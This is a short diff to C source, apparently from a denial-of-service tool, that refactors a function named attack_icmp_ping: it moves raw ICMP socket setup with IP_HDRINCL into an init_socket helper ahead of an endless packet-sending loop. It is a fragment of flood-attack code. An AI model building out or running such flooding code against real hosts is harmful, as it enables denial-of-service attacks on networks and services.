@@ -4,7 +4,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include "tcp_attack.h"
-#include "checksum.h"
+#include "utils.h"
 #include "types.h"
 
 void attack_icmp_ping(struct target_data *target)
@@ -36,15 +36,7 @@ void attack_icmp_ping(struct target_data *target)
 	target->addr.sin_family = AF_INET;
 	target->addr.sin_port = 0;
 	target->addr.sin_addr.s_addr = target->target_addr;
-
-	if ((target->sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
-		exit(EXIT_FAILURE);
-	}
-
-	int enable = 1;
-	if (setsockopt(target->sockfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(int)) == -1) {
-		exit(EXIT_FAILURE);
-	}
+	target->sockfd = init_socket(IPPROTO_ICMP);
 
 	while (1) {
 		iph->ident = rand() & 0xffff;
